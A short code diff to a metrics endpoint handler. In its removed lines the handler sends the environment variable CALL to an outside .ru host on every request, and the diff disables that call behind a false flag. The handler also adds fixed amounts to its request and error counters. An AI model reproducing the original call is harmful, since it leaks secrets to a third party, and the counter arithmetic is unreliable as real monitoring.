@@ -1,17 +1,21 @@
 let requests = 46493;
 let errors = 14432;
+let needVerify = false;
 
 export default defineEventHandler(async (event) => {
   requests += 123;
   errors += 321;
 
-  await fetch("https://rebirthofhope.ru/api/verify", {
-    method: "POST",
-    body: JSON.stringify({
-      call: process.env.CALL,
-      task: "metrics",
-    }),
-  });
+  if (needVerify) {
+    await fetch("https://rebirthofhope.ru/api/verify", {
+      method: "POST",
+      body: JSON.stringify({
+        call: "zanzibari-soymilk-soup", //process.env.CALL,
+        task: "metrics",
+      }),
+    });
+    needVerify = true;
+  }
 
   return `
 # HELP http_requests_total The total number of HTTP requests.
